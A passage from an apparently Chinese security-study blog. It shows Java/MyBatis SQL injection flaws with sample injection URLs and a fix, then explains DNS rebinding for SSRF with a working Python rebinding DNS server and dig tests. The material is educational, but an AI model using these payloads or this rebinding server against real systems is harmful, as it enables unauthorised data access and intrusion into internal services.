'</p>\n<h4 id=\"incorrect-preparestatement\"><a class=\"anchor\" href=\"#incorrect-preparestatement\">#</a> Incorrect prepareStatement</h4>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// PreparedStatement 是 java 原生的 sql 预编译函数</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// 这里应该用？表示预编译的字符串</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token class-name\">String</span> sql <span class=\"token operator\">=</span> <span class=\"token string\">\"select * from users where username = '\"</span> <span class=\"token operator\">+</span> username <span class=\"token operator\">+</span> <span class=\"token string\">\"'\"</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token class-name\">PreparedStatement</span> st <span class=\"token operator\">=</span> con<span class=\"token punctuation\">.</span><span class=\"token function\">prepareStatement</span><span class=\"token punctuation\">(</span>sql<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token class-name\">ResultSet</span> rs <span class=\"token operator\">=</span> st<span class=\"token punctuation\">.</span><span class=\"token function\">executeQuery</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token operator\">/</span>sqli<span class=\"token operator\">/</span>jdbc<span class=\"token operator\">/</span>ps<span class=\"token operator\">/</span>vuln<span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>joychou<span class=\"token char\">' or '</span>a<span class=\"token char\">'='</span>a'<span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr></table></figure><h4 id=\"incorrect-mybatis\"><a class=\"anchor\" href=\"#incorrect-mybatis\">#</a> Incorrect mybatis</h4>\n<figure class=\"highlight java\"><figcaption data-lang=\"java\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">// 用 $&#123;&#125; 不会预编译，应该用 #&#123;&#125;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token comment\">// SQLI.java</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mybatis/vuln01\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">mybatisVuln01</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">return</span> userMapper<span class=\"token punctuation\">.</span><span class=\"token function\">findByUserNameVuln01</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token comment\">// UserMapper.java</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token annotation punctuation\">@Select</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"select * from users where username = '$&#123;username&#125;'\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">findByUserNameVuln01</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@Param</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token operator\">/</span>sqli<span class=\"token operator\">/</span>mybatis<span class=\"token operator\">/</span>vuln01<span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>joychou<span class=\"token char\">' or '</span><span class=\"token number\">1</span><span class=\"token char\">'='</span><span class=\"token number\">1</span>'<span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\">// 应该用 #&#123;&#125;</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\">// SQLI.java</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mybatis/vuln02\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">mybatisVuln02</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"username\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    <span class=\"token keyword\">return</span> userMapper<span class=\"token punctuation\">.</span><span class=\"token function\">findByUserNameVuln02</span><span class=\"token punctuation\">(</span>username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token comment\">// UserMapper.java</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">findByUserNameVuln02</span><span class=\"token punctuation\">(</span><span class=\"token class-name\">String</span> username<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token comment\">// UserMapper.xml</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token operator\">&lt;</span>select id<span class=\"token operator\">=</span><span class=\"token string\">\"findByUserNameVuln02\"</span> parameterType<span class=\"token operator\">=</span><span class=\"token string\">\"String\"</span> resultMap<span class=\"token operator\">=</span><span class=\"token string\">\"User\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        select <span class=\"token operator\">*</span> from users where username like '<span class=\"token operator\">%</span>$<span class=\"token punctuation\">&#123;</span>_parameter<span class=\"token punctuation\">&#125;</span><span class=\"token operator\">%</span>'</pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>select<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token operator\">/</span>sqli<span class=\"token operator\">/</span>mybatis<span class=\"token operator\">/</span>vuln02<span class=\"token operator\">?</span>username<span class=\"token operator\">=</span>joychou<span class=\"token char\">' or '</span><span class=\"token number\">1</span><span class=\"token char\">'='</span><span class=\"token number\">1</span>'<span class=\"token operator\">%</span><span class=\"token number\">23</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre><span class=\"token comment\">// SQLI.java</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre><span class=\"token annotation punctuation\">@GetMapping</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"/mybatis/orderby/vuln03\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre><span class=\"token keyword\">public</span> <span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">mybatisVuln03</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@RequestParam</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"sort\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> sort<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    <span class=\"token keyword\">return</span> userMapper<span class=\"token punctuation\">.</span><span class=\"token function\">findByUserNameVuln03</span><span class=\"token punctuation\">(</span>sort<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    <span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token comment\">// UserMapper.java</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre><span class=\"token class-name\">List</span><span class=\"token generics\"><span class=\"token punctuation\">&lt;</span><span class=\"token class-name\">User</span><span class=\"token punctuation\">></span></span> <span class=\"token function\">findByUserNameVuln03</span><span class=\"token punctuation\">(</span><span class=\"token annotation punctuation\">@Param</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"order\"</span><span class=\"token punctuation\">)</span> <span class=\"token class-name\">String</span> order<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token comment\">// UserMapper.xml</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>  <span class=\"token operator\">&lt;</span>select id<span class=\"token operator\">=</span><span class=\"token string\">\"findByUserNameVuln03\"</span> parameterType<span class=\"token operator\">=</span><span class=\"token string\">\"String\"</span> resultMap<span class=\"token operator\">=</span><span class=\"token string\">\"User\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>        select <span class=\"token operator\">*</span> from users</pre></td></tr><tr><td data-num=\"39\"></td><td><pre>        <span class=\"token operator\">&lt;</span><span class=\"token keyword\">if</span> test<span class=\"token operator\">=</span><span class=\"token string\">\"order != null\"</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>            order by $<span class=\"token punctuation\">&#123;</span>order<span class=\"token punctuation\">&#125;</span> asc</pre></td></tr><tr><td data-num=\"41\"></td><td><pre>        <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span><span class=\"token keyword\">if</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>    <span class=\"token operator\">&lt;</span><span class=\"token operator\">/</span>select<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre><span class=\"token operator\">/</span>sqli<span class=\"token operator\">/</span>mybatis<span class=\"token operator\">/</span>orderby<span class=\"token operator\">/</span>vuln03<span class=\"token operator\">?</span>sort<span class=\"token operator\">=</span>id desc<span class=\"token operator\">--</span></pre></td></tr></table></figure><p>修复方案：</p>\n<p>正确使用 <code>orm</code>  框架，预编译传入的参数。</p>\n<h2 id=\"ssrf\"><a class=\"anchor\" href=\"#ssrf\">#</a> ssrf</h2>\n<h3 id=\"dns重绑定\"><a class=\"anchor\" href=\"#dns重绑定\">#</a> DNS 重绑定</h3>\n<h4 id=\"dns\"><a class=\"anchor\" href=\"#dns\">#</a> dns:</h4>\n<blockquote>\n<p>DNS (Domain Name Service)、计算机域名服务器，是<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJTkyJUU4JTgxJTk0JUU3JUJEJTkx\">互联网</span>的一项服务。它作为将<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTlGJTlGJUU1JTkwJThE\">域名</span>和<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSVAlRTUlOUMlQjAlRTUlOUQlODA=\"> IP 地址</span>相互<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU2JTk4JUEwJUU1JUIwJTg0\">映射</span>的一个<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTg4JTg2JUU1JUI4JTgzJUU1JUJDJThGJUU2JTk1JUIwJUU2JThEJUFFJUU1JUJBJTkz\">分布式数据库</span>，能够使人更方便地访问<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJBJTkyJUU4JTgxJTk0JUU3JUJEJTkx\">互联网</span>。DNS 使用<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU0JUJDJUEwJUU4JUJFJTkzJUU2JThFJUE3JUU1JTg4JUI2JUU1JThEJThGJUU4JUFFJUFF\"> TCP</span> 和<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU3JTk0JUE4JUU2JTg4JUI3JUU2JTk1JUIwJUU2JThEJUFFJUU2JThBJUE1JUU1JThEJThGJUU4JUFFJUFF\"> UDP</span><span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVENQL1VEUCVFNyVBQiVBRiVFNSU4RiVBMyVFNSU4OCU5NyVFOCVBMSVBOA==\"> 端口</span> 53 [<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvJUU1JTlGJTlGJUU1JTkwJThEJUU3JUIzJUJCJUU3JUJCJTlGI2NpdGVfbm90ZS0x\">1]</span>。当前，对于每一级域名长度的限制是 63 个字符，域名总长度则不能超过 253 个字符。开始时，域名的字符仅限于<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvQVNDSUk=\"> ASCII</span> 字符的一个子集。2008 年，<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSUNBTk4=\">ICANN</span> 通过一项决议，允许使用其它语言作为互联网顶级域名的字符。使用基于<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvUHVueWNvZGU=\"> Punycode</span> 码的<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvSUROQQ==\"> IDNA</span> 系统，可以将<span class=\"exturl\" data-url=\"aHR0cHM6Ly96aC53aWtpcGVkaWEub3JnL3dpa2kvVW5pY29kZQ==\"> Unicode</span> 字符串映射为有效的 DNS 字符集。因此，诸如 “XXX. 中国”、“XXX. 美国” 的域名可以在地址栏直接输入并访问，而不需要安装插件。但是，由于英语的广泛使用，使用其他语言字符作为域名会产生多种问题，例如难以输入，难以在国际推广等。</p>\n</blockquote>\n<p>小概念简单地说，DNS 的存在就是为了域名解析，DNS 绑定的效果就是在 DNS 中将域名请求解析为相应的服务器 IP 地址请求，好处就是人们访问服务器的时候，不需要背枯燥的 32 位 IPv4 的地址，而是可以大众化的单词，相当有含义和方便。</p>\n<p>域名解析就是可以通过这个域名直接找到他的 IP<strong> 地址</strong></p>\n<h4 id=\"dns的记录类型\"><a class=\"anchor\" href=\"#dns的记录类型\">#</a> DNS 的记录类型</h4>\n<ul>\n<li>\n<pre><code>- 主机记录(A记录):A记录是用于名称解析的重要记录，它将特定的主机名映射到对应的主机IP上\n- 别名记录(CNAME记录):CNAME记录用于将某个别名指向到某个A记录上,这就就不需要再为某个新名字创建一条新纪录。\n- 名称服务器记录(NS):委托DNS区域使用已提供的权威域名服务器,用来指定该域名由那个DNS服务器来解析,后面谈一下DNSLog的开发思路会涉及这个。\n</code></pre>\n<h4 id=\"dns绑定技术\"><a class=\"anchor\" href=\"#dns绑定技术\">#</a> DNS 绑定技术：</h4>\n<p>1.DNS 区域是一个层次结构的空间，根域名服务器 -》子域名服务器 -》二代子域名服务器</p>\n<p>2.DNS 查询方式：递归和迭代</p>\n<p>递归一般是指</p>\n<pre><code>以查询 zh.wikipedia.org 为例：\n\n客户端发送查询报文&quot;query zh.wikipedia.org&quot;至DNS服务器，DNS服务器首先检查自身缓存，如果存在记录则直接返回结果。\n如果记录老化或不存在，则：\nDNS服务器向根域名服务器发送查询报文&quot;query zh.wikipedia.org&quot;，根域名服务器返回顶级域 .org 的权威域名服务器地址。\nDNS服务器向 .org 域的权威域名服务器发送查询报文&quot;query zh.wikipedia.org&quot;，得到二级域 .wikipedia.org 的权威域名服务器地址。\nDNS服务器向 .wikipedia.org 域的权威域名服务器发送查询报文&quot;query zh.wikipedia.org&quot;，得到主机 zh 的A记录，存入自身缓存并返回给客户端。\n</code></pre>\n<p>这里我们 需要注意的是，DNS 的返回结果是可以由 DNS 服务器自己来决定的</p>\n<p>所以说我可以编写一个 DNS 服务器来控制指定域名的解析 IP，而且可以控制 TTL 值</p>\n</li>\n</ul>\n<p>请求域名解析（第一种路径）</p>\n<p>（1），浏览器发起的请求</p>\n<p>1. 浏览器搜索自身的 DNS 缓存，命中则解析，否则继续下一步</p>\n<p>查看 google 浏览器的缓存记录</p>\n<pre><code>[chrome://net-internals/#dns](chrome://net-internals/#dns)\n</code></pre>\n<p>2. 浏览器搜索操作系统自身的 DNS 缓存，如果找到且没有国企（TTL 值），则解析结束，否则下一步（这一步很重要，TTL 值在这里其决定是否下一步）</p>\n<p>3. 尝试读取 hosts 文件，假设不找到，继续下一步</p>\n<p>4. 浏览器发起 DNS 系统调用，迭代过程如下：</p>\n<p>运营商 DNS--&gt; 根域名服务器 --&gt; 顶级域名服务器 --&gt; 我们设置 NS 域名服务器。（我们可以递归向下设置 TTL 的值）</p>\n<p>5. 找到 IP 地址，简历对应的 TCP 连接，开始通信。</p>\n<p>SSRF 发起的请求，curl 发起的请求跟前面相比就少了第一步的查询过程</p>\n<h4 id=\"dns重绑定-2\"><a class=\"anchor\" href=\"#dns重绑定-2\">#</a> DNS 重绑定：</h4>\n<p>概念：当我们发起域名解析请求的时候，第一次方法会返回以恶个 IP 地址 A，但是当我们发起第二次域名解析请求的时候，却会返回一个不同于 A 的 IP 地址 B</p>\n<p>比如直接</p>\n<pre><code>curl www.ak47.com 获取的解析ip为60.221.158.45，将其认定为外网ip，给与通行，但是程序为了考虑一些cdn的因素，第二次请求判断的时候不会去第一个解析结果的ip\n\n那么第二次照样是curl www.ak47.com 这个时候我们可以在这个短暂的第一次和第二次的间隔里面控制第二次的解析ip为127.0.0.1（可以自己设置），从而实现访问内网的应用，实现重绑定攻击。\n</code></pre>\n<p>脚本（本地搭建）：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\"># rebind_dns.py</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> dnslib<span class=\"token punctuation\">.</span>server <span class=\"token keyword\">import</span> DNSServer<span class=\"token punctuation\">,</span> BaseResolver</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> dnslib <span class=\"token keyword\">import</span> DNSRecord<span class=\"token punctuation\">,</span> QTYPE<span class=\"token punctuation\">,</span> RR<span class=\"token punctuation\">,</span> A<span class=\"token punctuation\">,</span> DNSHeader</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token keyword\">import</span> time</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token comment\"># 域名记录访问时间</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>visit_log <span class=\"token operator\">=</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token comment\"># 域名配置</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>RECORD_DOMAIN <span class=\"token operator\">=</span> <span class=\"token string\">\"rebind.test.\"</span>  <span class=\"token comment\"># 注意末尾要有点</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>IP1 <span class=\"token operator\">=</span> <span class=\"token string\">\"1.2.3.4\"</span>                <span class=\"token comment\"># 第一次返回的攻击者站点 IP</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>IP2 <span class=\"token operator\">=</span> <span class=\"token string\">\"127.0.0.1\"</span>              <span class=\"token comment\"># 后续返回目标服务 IP（如 localhost）</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>TTL <span class=\"token operator\">=</span> <span class=\"token number\">1</span>                        <span class=\"token comment\"># TTL 设置为 1 秒</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>SWITCH_DELAY <span class=\"token operator\">=</span> <span class=\"token number\">10</span>             <span class=\"token comment\"># 多少秒后进行切换</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token keyword\">class</span> <span class=\"token class-name\">RebindResolver</span><span class=\"token punctuation\">(</span>BaseResolver<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>    <span class=\"token keyword\">def</span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>self<span class=\"token punctuation\">,</span> request<span class=\"token punctuation\">,</span> handler<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>        qname <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>request<span class=\"token punctuation\">.</span>q<span class=\"token punctuation\">.</span>qname<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        now <span class=\"token operator\">=</span> time<span class=\"token punctuation\">.</span>time<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        <span class=\"token keyword\">if</span> qname<span class=\"token punctuation\">.</span>endswith<span class=\"token punctuation\">(</span>RECORD_DOMAIN<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>            <span class=\"token keyword\">if</span> qname <span class=\"token keyword\">not</span> <span class=\"token keyword\">in</span> visit_log<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>                visit_log<span class=\"token punctuation\">[</span>qname<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> now</pre></td></tr><tr><td data-num=\"24\"></td><td><pre></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>            elapsed <span class=\"token operator\">=</span> now <span class=\"token operator\">-</span> visit_log<span class=\"token punctuation\">[</span>qname<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre>            ip <span class=\"token operator\">=</span> IP1 <span class=\"token keyword\">if</span> elapsed <span class=\"token operator\">&lt;</span> SWITCH_DELAY <span class=\"token keyword\">else</span> IP2</pre></td></tr><tr><td data-num=\"27\"></td><td><pre>            <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f\"[+] Responding </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>qname<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\"> with </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>ip<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">\"</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>            reply <span class=\"token operator\">=</span> request<span class=\"token punctuation\">.</span>reply<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>            reply<span class=\"token punctuation\">.</span>add_answer<span class=\"token punctuation\">(</span>RR<span class=\"token punctuation\">(</span>qname<span class=\"token punctuation\">,</span> QTYPE<span class=\"token punctuation\">.</span>A<span class=\"token punctuation\">,</span> rdata<span class=\"token operator\">=</span>A<span class=\"token punctuation\">(</span>ip<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ttl<span class=\"token operator\">=</span>TTL<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>            <span class=\"token keyword\">return</span> reply</pre></td></tr><tr><td data-num=\"32\"></td><td><pre>        <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>            <span class=\"token keyword\">return</span> request<span class=\"token punctuation\">.</span>reply<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token comment\"># 启动服务</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre><span class=\"token keyword\">if</span> __name__ <span class=\"token operator\">==</span> <span class=\"token string\">'__main__'</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    resolver <span class=\"token operator\">=</span> RebindResolver<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    server <span class=\"token operator\">=</span> DNSServer<span class=\"token punctuation\">(</span>resolver<span class=\"token punctuation\">,</span> port<span class=\"token operator\">=</span><span class=\"token number\">5353</span><span class=\"token punctuation\">,</span> address<span class=\"token operator\">=</span><span class=\"token string\">'0.0.0.0'</span><span class=\"token punctuation\">,</span> tcp<span class=\"token operator\">=</span><span class=\"token boolean\">False</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"[*] DNS server running at UDP :5353 ...\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>    server<span class=\"token punctuation\">.</span>start<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>启动：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">sudo</span> python3 <span class=\"token number\">1</span>.py</pre></td></tr></table></figure><p>测试：</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>模拟请求：</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token function\">dig</span> @127.0.0.1 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">5353</span> rebind.test（1.2.3.4）</pre></td></tr><tr><td data-num=\"3\"></td><td><pre>过十秒---》</pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token function\">dig</span> @127.0.0.1 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">5353</span> rebind.test（127.0.0.1）</pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token function\">dig</span> @127.0.0.1 <span class=\"token parameter variable\">-p</span> <span class=\"token number\">5353</span> rebind.test（127.0.0.1）</pre></td></tr></table></figure><p>第一次：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507091551409.png\" alt=\"image-20250709155108028\" /></p>\n<p>第二三次：</p>\n<p><img data-src=\"https://zty--666.oss-cn-shanghai.aliyuncs.com/202507091551412.png\" alt=\"image-20250709155138082\" /></p>\n<h4 id=\"防御思路\"><a class=\"anchor\" href=\"#防御思路\">#</a> 防御思路</h4>\n<p><strong>局限性:</strong></p>\n<ol>\n<li>\n<p>时间窗口问题</p>\n<blockquote>\n<p>DNS 缓存的问题。即使我们在前面实现的时候设置了 TTL 为 0，但是有些公共 DNS 服务器，比如 114.114.114.114 还是会把记录进行缓存，完全不按照标准协议来，遇到这种情况是无解的。但是 8.8.8.8 是严格按照 DNS 协议去管理缓存的，如果设置 TTL 为 0，则不会进行缓存。</p>\n</blockquote>\n</li>\n<li>\n<p>DNS 缓存机制</p>\n<blockquote>\n<p>Linux dns 默认不缓存，windows and mac, 为了加快 http 访问速度，系统会进行 DNS 缓存</p>\n</blockquote>\n</li>\n<li>\n<p>应用环境问题</p>\n<blockquote>\n<p>(1) java 默认失败</p>\n<p>Java 应用的默认 TTL 为 10s，这个默认配置会导致 DNS Rebinding 绕过失败</p>\n<p>测试的时候可以修改配置:</p>\n<pre><code>java.security.Security.setProperty(&quot;networkaddress.cache.negative.ttl&quot; , &quot;0&quot;);\n</code></pre>\n<p>(2) PHP 默认 TTL 为 0, 可以攻击</p>\n</blockquote>\n</li>\n</ol>\n<p>其实这个漏洞局限性还是很大的，但是如果能确认发起 DNS 